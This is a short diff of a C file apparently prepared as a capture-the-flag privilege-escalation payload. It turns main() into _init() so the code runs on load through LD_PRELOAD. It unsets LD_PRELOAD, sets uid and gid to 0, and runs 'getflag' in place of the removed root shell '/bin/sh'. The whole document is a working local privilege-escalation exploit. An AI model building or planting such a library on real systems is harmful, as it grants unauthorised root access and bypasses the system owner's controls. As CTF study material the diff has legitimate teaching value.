@@ -2,9 +2,9 @@
 #include <sys/types.h>
 #include <stdlib.h>
 
-void main() {
+void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
-system("/bin/sh");
+system("getflag");
 }
